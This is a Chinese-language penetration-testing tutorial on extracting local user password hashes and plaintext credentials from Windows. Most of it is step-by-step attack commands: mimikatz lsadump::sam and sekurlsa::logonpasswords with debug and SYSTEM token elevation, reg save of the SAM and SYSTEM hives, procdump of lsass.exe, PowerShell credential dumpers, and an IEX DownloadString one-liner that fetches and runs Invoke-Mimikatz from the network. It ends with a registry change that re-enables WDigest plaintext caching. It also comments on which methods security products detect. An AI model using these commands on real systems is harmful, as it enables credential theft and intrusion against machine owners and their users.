## 前言

* 在Windows操作系统上，sam数据库（C:\Windows\System32\config\sam）里保存着本地用户的hash。
* 在本地认证的流程中，作为本地安全权限服务进程lsass.exe也会把用户密码缓存在内存中（dmp文件）。

从上面的两个思路开始，我们利用mimkatz工具作为辅助，来抓取本地用户的hash。

## SAM数据库提取

[https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)

```
lsadump::sam
```

此命令可以转存储SAM数据库，里面包含了本地用户的密码hash。

它有两种工作模式： `online` and `offline`。

### online 模式

online工作模式：需要用户具备 **SYSTEM权限**或 **使用模拟的SYSTEM令牌**，否则将会产生拒绝访问报错：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083603-b03ecb96-35c8-1.png)

下面通过使用模拟SYSTEM令牌（token::elevate）进行演示：

```
privilege::debug
token::elevate
lsadump::sam
```

* **privilege::debug** 获得debug权限。
* **token::elevate** 模拟一个system令牌。

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083646-c9f17aca-35c8-1.png)

### offline 模式

offline模式：获取当前系统的SAM数据库文件，在另一系统下进行读取。Win2000和XP需要先提到SYSTEM，03开始直接可以reg save。

导出SAM数据库文件有以下两种实现方法：

* **保存注册表*

```
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083709-d793d416-35c8-1.png)

文件保存在执行命令的目录：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083729-e3c1c612-35c8-1.png)

* **复制文件*

```
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
```

默认无法复制：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083746-edf1c3d0-35c8-1.png)

需要借助工具：[https://github.com/3gstudent/NinjaCopy](https://github.com/3gstudent/NinjaCopy)

导出SAM数据库后，把文件放置mimikatz目录下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083759-f572aeee-35c8-1.png)

执行命令：

```
lsadump::sam /sam:sam.hiv /system:system.hiv
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083812-fd1aafde-35c8-1.png)

### 工作原理

参考：[渗透技巧-通过sam数据库获取本地用户hash](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/)

1. 读取hklm\system获取syskey
2. 使用syskey解密hklm\sam

### 优缺点比较

online模式：使用简单，但是特征明显，通常会被安全产品拦截。

offline模式：导出的文件大，效率低，但是安全。

### 其他工具

* **pwdump7** 下载地址： [http://passwords.openwall.net/b/pwdump/pwdump7.zip](http://passwords.openwall.net/b/pwdump/pwdump7.zip)

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083828-0704fcd4-35c9-1.png)

* **powershell** 下载地址： [https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1) 下载后本地执行：

```
powershell Import-Module .\Invoke-PowerDump.ps1;Invoke-PowerDump
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083839-0d4302b2-35c9-1.png)

* **QuarkPwDump** 项目地址：[https://github.com/quarkslab/quarkspwdump](https://github.com/quarkslab/quarkspwdump) 已编译版本：[https://github.com/redcanari/quarkspwdump/releases](https://github.com/redcanari/quarkspwdump/releases)

## lsass内存提权

### 使用mimikatz直接导出凭证

[https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)

该模块从lsass.exe的内存中提权hash，需要具备下面的条件之一：

* administrator，可以通过privilege::debug获得调试权限
* SYSTEM权限

下面通过privilege::debug进行演示：

* **本地交互式抓取：*

```
privilege::debug
log
sekurlsa::logonpasswords
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083854-1689086c-35c9-1.png)

会在当前shell运行的目录下生成 `mimikatz.log`：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083906-1d759dc0-35c9-1.png)

* **本地非交互式抓取：*

```
mimikatz.exe log "privilege::debug" "sekurlsa::logonPasswords full" exit
```

缺点也非常明显，通常会被安全产品拦截。

* **powershell加载mimikatz抓取：*

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```

或者下载本地执行：

```
powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "log" "sekurlsa::logonPasswords full"'
```

### 通过lsass进程的dmp文件导出凭证

[https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083924-2841b3e2-35c9-1.png)

会在当前目录生成lsass.dmp文件：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083936-2f6deea6-35c9-1.png)

然后从lsass.dmp文件导出凭证，通过mimikatz完成：

```
mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20201204083949-37176434-35c9-1.png)

* **工作原理以及bypass：** 参考：[渗透基础-从lsass.exe进行导出凭证](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE/) 通过API `MiniDumpWriteDump()`获得lsass.exe进程的dmp文件。

* **明文密码问题：** 参考：[红蓝对抗之Windows内网渗透](https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA) 为什么有的抓不到明文密码，主要还是 **kb2871997**的问题。kb2871997补丁会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。 但是用户可以手动开启：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
